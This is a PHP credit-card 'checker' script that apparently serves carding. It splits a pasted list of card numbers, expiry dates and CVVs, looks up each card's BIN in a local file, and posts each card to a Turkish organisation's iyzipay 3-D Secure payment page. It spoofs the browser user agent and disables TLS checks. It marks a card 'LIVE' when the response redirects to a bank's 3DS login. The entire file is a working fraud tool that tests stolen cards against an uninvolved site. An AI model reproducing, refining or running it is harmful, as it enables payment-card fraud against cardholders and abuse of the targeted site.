<?php
session_start();
error_reporting(0);

if (file_exists("cookie.txt")) {
unlink("cookie.txt");}

$time = time();

function multiexplode($delimiters, $string) {
$one = str_replace($delimiters, $delimiters[0], $string);
$two = explode($delimiters[0], $one);
return $two;}


$lista = $_GET['lista'];
$cc = multiexplode(array("|", " "), $lista)[0];
$mes = multiexplode(array("|", " "), $lista)[1];
$ano = multiexplode(array("|", " "), $lista)[2];
$cvv = multiexplode(array("|", " "), $lista)[3];



function bin ($cc){
$contents = file_get_contents("bins.csv");
$pattern = preg_quote(substr($cc, 0, 6), '/');
$pattern = "/^.*$pattern.*\$/m";
if (preg_match_all($pattern, $contents, $matches)) {
$encontrada = implode("\n", $matches[0]);
}
$pieces = explode(";", $encontrada);
return "$pieces[1] $pieces[2] $pieces[3] $pieces[4] $pieces[5]";
}
$bin = bin($lista);

function getStr($string, $start, $end) {
$str = explode($start, $string);
$str = explode($end, $str[1]);
return $str[0];}



$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.thkd.org.tr/iyzipay-php-master/samples/initialize_threeds.php');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_ENCODING, "gzip");
curl_setopt($ch, CURLOPT_HTTPHEADER, array(

'Host: www.thkd.org.tr',
'origin: https://www.thkd.org.tr',
'user-agent: Mozilla/5.0 (Linux; Android 8.1.0; SM-G610M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.185 Mobile Safari/537.36',
'content-type: application/x-www-form-urlencoded; charset=UTF-8',
'referer: https://www.thkd.org.tr/'

)); 
curl_setopt($ch, CURLOPT_POSTFIELDS, 'spam_checker=&token=&cc-email-bos=cstoddy129%40gmail.com&cc-payment-bos=50&cc-name-bos=Isisisi+siisis&cc-number-bos='.$cc.'&cc-exp-bos='.$mes.'%2F'.$ano.'&x_card_code-bos=319&kartokut-bos=ok');
$data1 = curl_exec($ch);



if (strpos($data1, 'https://www58.bb.com.br/ThreeDSecureAuth/vbvLogin/auth.bb')) {
exit('<b><span class="badge badge-success">LIVE</span> ➜ <font style=color:#ffcc00>'.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'</font> ➜ <font style=color:#ffcc00>'.$bin.'</font> <span class="badge badge-primary">VBV/MSC</span> ➜ ' . (time() - $time) .  ' Seg</b><br>');}

else{
exit('<b><span class="badge badge-danger">DIE</span> ➜ '.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.' ➜ '.$bin.' ➜ <span class="badge badge-primary">NEGOU VBV/MSC</span> ➜ ' . (time() - $time) .  ' Seg</b><br>');}

?>